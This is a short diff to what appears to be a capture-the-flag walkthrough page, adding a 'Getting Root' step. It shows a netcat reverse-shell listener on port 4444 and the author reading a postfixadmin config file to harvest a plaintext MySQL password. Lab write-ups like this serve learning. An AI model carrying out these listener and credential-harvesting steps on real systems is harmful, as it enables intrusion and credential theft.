@@ -131,6 +131,14 @@ zsh: suspended  nc -lvnp 4444
 [1]  + continued  nc -lvnp 4444
         </pre>
 
+        <h2>Getting Root</h2>
+
+        <li>At this point we already know mysql is running on the box.  So I look for the credentials.  They are found in /var/www/config.local.php</li>
+
+        <pre>
+hostmaster@spaghetti:/var/www/postfixadmin$ cat config.local.php &#13;&#10;&lt;?php&#13;&#10;$CONF[&apos;configured&apos;] = true;&#13;&#10;$CONF[&apos;password_expiration&apos;] = &apos;YES&apos;;&#13;&#10;$CONF[&apos;database_type&apos;] = &apos;mysqli&apos;;&#13;&#10;$CONF[&apos;database_host&apos;] = &apos;localhost&apos;;&#13;&#10;$CONF[&apos;database_user&apos;] = &apos;postfixadmin&apos;;&#13;&#10;$CONF[&apos;database_password&apos;] = &apos;P4s8vV0r6&apos;;&#13;&#10;$CONF[&apos;database_name&apos;] = &apos;postfixadmin&apos;;
+        </pre>
+
 
 
 
